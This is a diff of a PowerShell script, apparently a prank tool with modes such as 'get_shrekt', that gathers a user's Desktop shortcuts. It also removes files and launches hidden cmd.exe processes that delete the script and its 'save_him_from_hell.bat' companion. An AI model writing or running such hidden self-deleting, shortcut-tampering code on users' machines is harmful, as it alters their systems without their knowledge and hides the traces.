@@ -23,11 +23,39 @@ if ($args -contains "without_empathy") {
 
 if ($mode -notin @("save_him_from_hell", "ah_shit..._here_we_go_again", "get_shrekt")) {
     
-    # Get the links on the Desktop
+    # Get the links on the Desktop (SAFE MODE)
     $links = @()
+    $WshShell = New-Object -ComObject WScript.Shell
 
-    if ((Test-Path "$env:USERPROFILE\Desktop")) {$links+=dir "$env:USERPROFILE\Desktop\*.lnk"}
-    if ((Test-Path "$env:USERPROFILE\OneDrive\Desktop")){$links+=dir "$env:USERPROFILE\OneDrive\Desktop\*.lnk"}
+    $desktopPaths = @(
+        "$env:USERPROFILE\Desktop",
+        "$env:USERPROFILE\OneDrive\Desktop"
+    )
+
+    foreach ($path in $desktopPaths) {
+
+        if (Test-Path $path) {
+
+            Get-ChildItem "$path\*.lnk" -ErrorAction SilentlyContinue | ForEach-Object {
+
+                try {
+                    $shortcut = $WshShell.CreateShortcut($_.FullName)
+
+                    # Ignore special shortcuts
+                    if ([string]::IsNullOrWhiteSpace($shortcut.TargetPath)) { continue }
+                    if ($shortcut.TargetPath -like "::{*}") { continue }
+                    if ($shortcut.TargetPath -match "^shell:") { continue }
+                    if ($shortcut.TargetPath -match "control.exe|explorer.exe") { continue }
+
+                    $links += $_
+
+                } catch {
+                    continue
+                }
+            }
+
+        }
+    }
 
     # If we got at least one link...
     if($links.Count -ge 1){
@@ -154,7 +182,6 @@ Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "get_shrekt"
     }
 
     Remove-Item "$env:USERPROFILE\Backup\links.db"
-    Remove-Item "$env:USERPROFILE\Data\save_him_from_hell.bat"
     Remove-Item "$env:USERPROFILE\Data\src\data.zip"
     Remove-Item "$env:USERPROFILE\Data\src"
 
@@ -171,6 +198,7 @@ Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "get_shrekt"
 
     # Delete the script
     Start-Process cmd.exe -ArgumentList "/c timeout 5 & del `"$env:USERPROFILE\Data\MEGA_links.ps1`"" -WindowStyle Hidden
+    Start-Process cmd.exe -ArgumentList "/c timeout 5 & del `"$env:USERPROFILE\Data\save_him_from_hell.bat`"" -WindowStyle Hidden
 
     # stop logging
     Stop-Transcript
